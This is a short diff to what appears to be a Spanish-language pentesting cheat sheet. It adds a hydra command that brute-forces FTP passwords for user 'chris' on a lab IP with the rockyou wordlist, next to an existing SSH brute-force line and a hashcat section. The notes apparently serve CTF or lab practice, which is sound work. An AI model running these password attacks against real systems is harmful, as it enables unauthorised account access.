@@ -85,6 +85,10 @@ ssh
 ```
 hydra -l molly -P /usr/share/wordlists/rockyou.txt 192.168.1.110 -t 4 ssh
 ```
+ftp
+```
+hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.70.92 ftp
+```
 ### HASHCAT
 Lista de modos (algoritmos) a escanear: https://hashcat.net/wiki/doku.php?id=example_hashes
 ```
